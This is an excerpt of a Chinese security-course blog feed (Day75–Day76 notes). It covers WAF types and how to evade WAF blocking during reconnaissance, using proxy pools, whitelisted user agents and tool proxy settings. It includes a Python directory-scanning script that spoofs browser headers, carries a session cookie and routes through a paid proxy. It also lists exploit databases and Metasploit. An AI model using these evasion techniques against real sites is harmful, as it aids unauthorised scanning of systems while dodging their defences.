class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">​        t=threading.Thread(target=string)</span><br><span class="line">​        t.start()</span><br></pre></td></tr></table></figure><h4 id="拓展-脚本后门脚本类型-JSP-amp-ASPX"><a href="#拓展-脚本后门脚本类型-JSP-amp-ASPX" class="headerlink" title="#拓展-脚本后门脚本类型-JSP&amp;ASPX"></a>#拓展-脚本后门脚本类型-JSP&amp;ASPX</h4><h5 id="5-php-脚本生成器"><a href="#5-php-脚本生成器" class="headerlink" title="5.php 脚本生成器"></a>5.php 脚本生成器</h5><p>Webshell-venom</p><p>ASP PHP JSP ASPX </p>]]></content>
      
      
      <categories>
          
          <category> WAF攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day76 WAF攻防-信息收集&amp;识别&amp;被动探针&amp;代理池&amp;仿指纹&amp;白名单</title>
      <link href="/2023/03/23/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/"/>
      <url>/2023/03/23/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/k6WhoSjwnthxzJ7Bbz0z9w.png" alt="img"></p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/Amxzx2zGAlrS3bYdMQAkaw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、WAF介绍&amp;模式&amp;识别&amp;防护等</p><p>2、信息收集-被动扫描&amp;第三方接口</p><p>3、信息收集-基于爬虫&amp;文件目录探针</p><p>4、信息收集-基于用户&amp;代理池&amp;白名单</p><h3 id="章节点："><a href="#章节点：" class="headerlink" title="#章节点："></a>#章节点：</h3><p>WAF绕过主要集中在信息收集，漏洞发现，漏洞利用，权限控制四个阶段。</p><h3 id="补充点："><a href="#补充点：" class="headerlink" title="#补充点："></a>#补充点：</h3><h4 id="1、什么是WAF？"><a href="#1、什么是WAF？" class="headerlink" title="1、什么是WAF？"></a>1、什么是WAF？</h4><p>Web Application Firewall（web应用防火墙），一种公认的说法是“web应用防火墙通过执行一系列针对HTTP&#x2F;HTTPS的安全策略来专门为web应用提供保护的一款产品。</p><p>基本可以分为以下4种</p><h5 id="软件型WAF"><a href="#软件型WAF" class="headerlink" title="软件型WAF"></a>软件型WAF</h5><p>以软件的形式安装在服务器上面，可以接触到服务器上的文件，因此就可以检测服务器上是否有webshell，是否有文件被创建等。</p><h5 id="硬件型WAF"><a href="#硬件型WAF" class="headerlink" title="硬件型WAF"></a>硬件型WAF</h5><p>以硬件形式部署在链路中，支持多种部署方式。当串联到链路上时可以拦截恶意流量，在旁路监听模式时只记录攻击但是不进行拦截。</p><h5 id="云-WAF"><a href="#云-WAF" class="headerlink" title="云 WAF"></a>云 WAF</h5><p>一般以反向代理的形式工作，通过配置后，使对网站的请求数据优先经过WAF主机，在WAF主机对数据进行过滤后再传给服务器</p><h5 id="网站内置的WAF"><a href="#网站内置的WAF" class="headerlink" title="网站内置的WAF"></a>网站内置的WAF</h5><p>就是来自网站内部的过滤，直接出现在网站代码中，比如说对输入的参数强制类转换啊，对输入的参数进行敏感词检测啊什么的</p><h4 id="2、如何判断WAF？"><a href="#2、如何判断WAF？" class="headerlink" title="2、如何判断WAF？"></a>2、如何判断WAF？</h4><h5 id="Wafw00f，看图识别，其他项目脚本平台"><a href="#Wafw00f，看图识别，其他项目脚本平台" class="headerlink" title="Wafw00f，看图识别，其他项目脚本平台"></a>Wafw00f，看图识别，其他项目脚本平台</h5><p><a href="https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ">https://mp.weixin.qq.com/s/3uUZKryCufQ_HcuMc8ZgQQ</a></p><h4 id="3、常见WAF拓扑-amp-防护？"><a href="#3、常见WAF拓扑-amp-防护？" class="headerlink" title="3、常见WAF拓扑&amp;防护？"></a>3、常见WAF拓扑&amp;防护？</h4><p>见上图流量走向&amp;常见漏洞</p><h4 id="4、目前有哪些常见WAF产品？"><a href="#4、目前有哪些常见WAF产品？" class="headerlink" title="4、目前有哪些常见WAF产品？"></a>4、目前有哪些常见WAF产品？</h4><p>参考：<a href="https://blog.csdn.net/w2sft/article/details/104533082/">https://blog.csdn.net/w2sft/article/details/104533082/</a></p><h6 id="①-硬件型"><a href="#①-硬件型" class="headerlink" title="① 硬件型"></a>① 硬件型</h6><p>硬件型WAF以一个独立的硬件设备的形态存在，支持以多种方式（如透明桥接模式、旁路模式、反向代理等）部署到网络中为后端的Web应用提供安全防护，是最为传统的WAF型态，在受访企业中部署占比为35.2%。相对于软件产品类的WAF，这类产品的优点是性能好、功能全面、支持多种模式部署等，但它的价格通常比较贵。国内的绿盟、安恒、启明星辰等老牌厂商旗下的WAF都属于此类。</p><h6 id="②-软件型"><a href="#②-软件型" class="headerlink" title="② 软件型"></a>② 软件型</h6><p>这种类型的WAF采用纯软件的方式实现，特点是安装简单，容易使用，成本低。但它的缺点也是显而易见的，除了性能受到限制外，还可能会存在兼容性、安全等问题。这类WAF的代表有ModSecurity、Naxsi、ShareWAF、安全狗等。</p><h6 id="③-云WAF"><a href="#③-云WAF" class="headerlink" title="③ 云WAF"></a>③ 云WAF</h6><p>随着云计算技术的快速发展，使得基于云的WAF实现成为可能，在本次调查中占比甚至超过了传统的硬件WAF跃升为第一位，达到39.4%。阿里云、腾讯云、深信服云WAF、Imperva WAF是这类WAF的典型代表。</p><blockquote><p>演示案例：</p><p>​                ➢ 信息收集-被动扫描-黑暗引擎&amp;三方接口</p><p>​                ➢ 信息收集-目录扫描-Python代理加载脚本</p><p>​                ➢ 信息收集-爬虫扫描-Awvs&amp;Xray&amp;Goby内置</p></blockquote><h4 id="信息收集常见检测："><a href="#信息收集常见检测：" class="headerlink" title="#信息收集常见检测："></a>#信息收集常见检测：</h4><p>1、脚本或工具速度流量快</p><p>2、脚本或工具的指纹被识别</p><p>3、脚本或工具的检测Payload</p><h4 id="信息收集常见方法："><a href="#信息收集常见方法：" class="headerlink" title="#信息收集常见方法："></a>#信息收集常见方法：</h4><p>1、延迟：解决请求过快封IP的情况</p><p>2、代理池：在确保速度的情况下解决请求过快封IP的拦截</p><p>3、白名单：模拟白名单模拟WAF授权测试，解决速度及测试拦截</p><p>4、模拟用户：模拟真实用户数据包请求探针，解决WAF指纹识别</p><h4 id="信息收集-被动扫描-黑暗引擎-amp-三方接口"><a href="#信息收集-被动扫描-黑暗引擎-amp-三方接口" class="headerlink" title="#信息收集-被动扫描-黑暗引擎&amp;三方接口"></a>#信息收集-被动扫描-黑暗引擎&amp;三方接口</h4><p>黑暗引擎：Fofa Quake Shodan zoomeye 0.zone等</p><p>其他接口：<a href="https://forum.ywhack.com/bountytips.php?getinfo">https://forum.ywhack.com/bountytips.php?getinfo</a></p><h4 id="信息收集-目录扫描-Python代理加载脚本"><a href="#信息收集-目录扫描-Python代理加载脚本" class="headerlink" title="#信息收集-目录扫描-Python代理加载脚本"></a>#信息收集-目录扫描-Python代理加载脚本</h4><p>7kb不能用代理</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323181620752.png"></p><p>采用Proxifier</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323181751641.png" alt="image-20230323181751641"></p><p>正常运行</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323181820456.png" alt="image-20230323181820456"></p><p>配置代理规则</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323181902338.png" alt="image-20230323181902338"></p><p>发现工具怎么都扫不出来，即使是实际存在的文件</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323182321123.png" alt="image-20230323182321123"></p><p>这里手工访问，是实际存在的文件，却扫不出来</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323182414092.png" alt="image-20230323182414092"></p><p>用脚本扫描可模拟用户访问，防止被封</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">headers=&#123;</span><br><span class="line">​    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;document&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;navigate&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Sec-Fetch-User&#x27;</span>: <span class="string">&#x27;?1&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">​    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&#x27;</span>,</span><br><span class="line">   <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;bdshare_firstime=1581597934650; PHPSESSID=ncsajdvh39qse0qlsgqokshuc4; yx_auth=dc4fq8FAEkyiAUZ54b5zl9GGStCxXoRb1TFaAaozygMiSc5uZYHjR3gCQm%2BtKNz3bcjbTi8BRgcd%2F7LvR0lHN1j319CI6x29Z2QDI38&#x27;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> paths <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&#x27;php_b.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>):</span><br><span class="line">​    url=<span class="string">&#x27;http://www.testxiaodi.fun/&#x27;</span></span><br><span class="line">​    paths=paths.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">​    urls=url+paths</span><br><span class="line">​    proxy = &#123;</span><br><span class="line">​        <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;tps686.kdlapi.com:15818&#x27;</span>,</span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">try</span>:</span><br><span class="line">​        code=requests.get(urls,headers=headers,proxies=proxy).status_code</span><br><span class="line">​        \<span class="comment">#req=requests.get(urls, headers=headers, proxies=proxy)</span></span><br><span class="line">​        \<span class="comment">#print(urls)</span></span><br><span class="line">​        \<span class="comment">#print(req.text)</span></span><br><span class="line">​        \<span class="comment">#time.sleep()</span></span><br><span class="line">​        <span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line">​        <span class="keyword">if</span> code==<span class="number">200</span> <span class="keyword">or</span> code==<span class="number">403</span>:</span><br><span class="line">​            <span class="built_in">print</span>(urls+<span class="string">&#x27;|&#x27;</span>+<span class="built_in">str</span>(code))</span><br><span class="line">​    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">​        <span class="built_in">print</span>(<span class="string">&#x27;connecting error&#x27;</span>)</span><br><span class="line">​        time.sleep(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>​        </p><h4 id="信息收集-工具扫描-Awvs-amp-Xray-amp-Goby内置"><a href="#信息收集-工具扫描-Awvs-amp-Xray-amp-Goby内置" class="headerlink" title="#信息收集-工具扫描-Awvs&amp;Xray&amp;Goby内置"></a>#信息收集-工具扫描-Awvs&amp;Xray&amp;Goby内置</h4><p>如果扫描网站，假设是安全狗，有cc流量防护，扫描一会就会封ip</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323195214555.png" alt="image-20230323195214555"></p><p>那么可以将访问UA头改为其白名单，再次扫描的时候不会封ip，可以正常扫描结束，而且可以正常访问网站</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323195256064.png" alt="image-20230323195256064"></p><h5 id="Awvs-设置速度-amp-加入代理"><a href="#Awvs-设置速度-amp-加入代理" class="headerlink" title="Awvs-设置速度&amp;加入代理"></a>Awvs-设置速度&amp;加入代理</h5><p>Awvs这里可以设置代理池的网址</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323195516116.png" alt="image-20230323195516116"></p><p>扫描BT时，大部分被拦截</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323201139833.png" alt="image-20230323201139833"></p><p>经过大量的爬虫，是有一个可以通过</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323201125492.png" alt="image-20230323201125492"></p><h5 id="Xray-配置修改-amp-进程转发"><a href="#Xray-配置修改-amp-进程转发" class="headerlink" title="Xray-配置修改&amp;进程转发"></a>Xray-配置修改&amp;进程转发</h5><p>1、可以在专有的配置文件里面设置代理地址</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323195717530.png" alt="image-20230323195717530"></p><p>2、还可以用Proxifier工具实现,一样的效果</p><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323195954242.png" alt="image-20230323195954242"></p><h5 id="Goby-配置加入Socket代理"><a href="#Goby-配置加入Socket代理" class="headerlink" title="Goby-配置加入Socket代理"></a>Goby-配置加入Socket代理</h5><p><img src="/../images/Day76-WAF%E6%94%BB%E9%98%B2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E8%AF%86%E5%88%AB-%E8%A2%AB%E5%8A%A8%E6%8E%A2%E9%92%88-%E4%BB%A3%E7%90%86%E6%B1%A0-%E4%BB%BF%E6%8C%87%E7%BA%B9-%E7%99%BD%E5%90%8D%E5%8D%95/image-20230323200525162.png" alt="image-20230323200525162"></p>]]></content>
      
      
      <categories>
          
          <category> WAF攻防 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Day75 漏洞利用-MSF框架&amp;CVE&amp;CNVD&amp;POC&amp;EXP监控&amp;查找&amp;整理</title>
      <link href="/2023/03/20/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/"/>
      <url>/2023/03/20/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/48O5yUHYy971wnQJ4thPCw.png" alt="img"></p><h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、MSF-漏洞利用框架使用</p><p>2、库查找-CVE&amp;CNVD&amp;关键字</p><p>3、库整理-CVE&amp;CNVD漏洞详情</p><p>4、新漏洞-框架或其他未集成利用</p><p>集成和未集成漏洞的利用思路，漏洞利用条件等。</p><h3 id="漏洞资源："><a href="#漏洞资源：" class="headerlink" title="#漏洞资源："></a>#漏洞资源：</h3><p>today-cve</p><p><a href="https://cassandra.cerias.purdue.edu/CVE_changes/today.html">https://cassandra.cerias.purdue.edu/CVE_changes/today.html</a></p><p>cve官网</p><p><a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p><p>国家信息安全漏洞共享平台</p><p><a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a></p><p>国家信息安全漏洞库</p><p><a href="http://www.cnnvd.org.cn/">http://www.cnnvd.org.cn/</a> seebug</p><h4 id="漏洞发现后，一般会有哪些关于漏洞的常见信息："><a href="#漏洞发现后，一般会有哪些关于漏洞的常见信息：" class="headerlink" title="漏洞发现后，一般会有哪些关于漏洞的常见信息："></a>漏洞发现后，一般会有哪些关于漏洞的常见信息：</h4><p>1、漏洞对象</p><p>2、漏洞编号</p><p>3、漏洞类型</p><blockquote><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>​                ➢ 漏洞利用-整理库-PocOrExp&amp;CVE-CNVD</p><p>​                ➢ 漏洞利用-查找库-SearchSploit&amp;PoC-in-GitHub</p><p>​                ➢ 漏洞利用-模块框架-MetaSploit-Framework（MSF）</p><p>​                ➢ 漏洞利用-杂乱工具-特定图像化渗透武器库（V6.1）</p></blockquote><h4 id="漏洞利用-整理库-PocOrExp-amp-CVE-CNVD"><a href="#漏洞利用-整理库-PocOrExp-amp-CVE-CNVD" class="headerlink" title="#漏洞利用-整理库-PocOrExp&amp;CVE-CNVD"></a>#漏洞利用-整理库-PocOrExp&amp;CVE-CNVD</h4><p><a href="https://github.com/ttonys/Scrapy-CVE-CNVD">https://github.com/ttonys/Scrapy-CVE-CNVD</a></p><p><a href="https://github.com/ycdxsb/PocOrExp_in_Github">https://github.com/ycdxsb/PocOrExp_in_Github</a></p><h4 id="漏洞利用-查找库-SearchSploit-amp-PoC-in-GitHub"><a href="#漏洞利用-查找库-SearchSploit-amp-PoC-in-GitHub" class="headerlink" title="#漏洞利用-查找库-SearchSploit&amp;PoC-in-GitHub"></a>#漏洞利用-查找库-SearchSploit&amp;PoC-in-GitHub</h4><p><a href="https://github.com/nomi-sec/PoC-in-GitHub%EF%BC%88%E5%88%AB%E4%BA%BA%E5%B7%B2%E7%BB%8F%E5%86%99%E5%A5%BD%E4%BA%86%E5%B9%B6%E5%BD%92%E7%BA%B3%E4%BA%86%E7%9A%84%EF%BC%88%E5%B8%B8%E6%9B%B4%EF%BC%89%EF%BC%89">https://github.com/nomi-sec/PoC-in-GitHub（别人已经写好了并归纳了的（常更））</a></p><p><a href="https://github.com/offensive-security/exploitdb">https://github.com/offensive-security/exploitdb</a></p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322173143966.png" alt="image-20230322173143966"></p><h5 id="1、如果漏洞没有集成应该怎么办？"><a href="#1、如果漏洞没有集成应该怎么办？" class="headerlink" title="**1、如果漏洞没有集成应该怎么办？"></a>**1、如果漏洞没有集成应该怎么办？</h5><p>比如，要搜索这个漏洞</p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322173727340.png" alt="image-20230322173727340"></p><p>在msf上面搜索发现没有集成</p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322173810039.png" alt="image-20230322173810039"></p><p>而在上面的github项目里面却发现此漏洞有归纳进去</p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322173857971.png" alt="image-20230322173857971"></p><p>不知道漏洞编号配合关键字搜索相关的个个测试</p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322173945420.png" alt="image-20230322173945420"></p><p>打开对应的json文件，里面有漏洞exp利用的地址</p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322174216686.png" alt="image-20230322174216686"></p><p>下在本地利用</p><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322174249846.png" alt="image-20230322174249846"></p><h4 id="漏洞利用-模块框架-MetaSploit-Framework（MSF）"><a href="#漏洞利用-模块框架-MetaSploit-Framework（MSF）" class="headerlink" title="#漏洞利用-模块框架-MetaSploit-Framework（MSF）"></a>#漏洞利用-模块框架-MetaSploit-Framework（MSF）</h4><p><a href="https://www.metasploit.com/">https://www.metasploit.com/</a></p><h5 id="安装下载"><a href="#安装下载" class="headerlink" title="安装下载:"></a>安装下载:</h5><p><a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html</a></p><h5 id="简单使用："><a href="#简单使用：" class="headerlink" title="简单使用："></a>简单使用：</h5><p><a href="https://blog.csdn.net/weixin_42380348/article/details/123549631">https://blog.csdn.net/weixin_42380348/article/details/123549631</a></p><h4 id="漏洞利用-杂乱工具-特定图像化渗透武器库（V6-1）"><a href="#漏洞利用-杂乱工具-特定图像化渗透武器库（V6-1）" class="headerlink" title="#漏洞利用-杂乱工具-特定图像化渗透武器库（V6.1）"></a>#漏洞利用-杂乱工具-特定图像化渗透武器库（V6.1）</h4><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230322183242785.png" alt="image-20230322183242785"></p><p><a href="https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q">https://mp.weixin.qq.com/s/Ha1R17KH-vssbr8cmYwl4Q</a></p><p>ONE-FOX工具箱更齐全</p><h5 id="2、还有很多漏洞没有工具怎么办？"><a href="#2、还有很多漏洞没有工具怎么办？" class="headerlink" title="**2、还有很多漏洞没有工具怎么办？"></a>**2、还有很多漏洞没有工具怎么办？</h5><p>整理完善，才能做到尽量的掌握或了解</p><p>获取下载已知的漏洞</p><p>实时监控新出的漏洞</p><p>cve整理完善</p><p>cnvd整理完善</p><h5 id="3、找不到系列漏洞怎么办？"><a href="#3、找不到系列漏洞怎么办？" class="headerlink" title="**3、找不到系列漏洞怎么办？"></a>**3、找不到系列漏洞怎么办？</h5><p><img src="/../images/Day75-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-MSF%E6%A1%86%E6%9E%B6-CVE-CNVD-POC-EXP%E7%9B%91%E6%8E%A7-%E6%9F%A5%E6%89%BE-%E6%95%B4%E7%90%86/image-20230323153800884.png" alt="image-20230323153800884"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
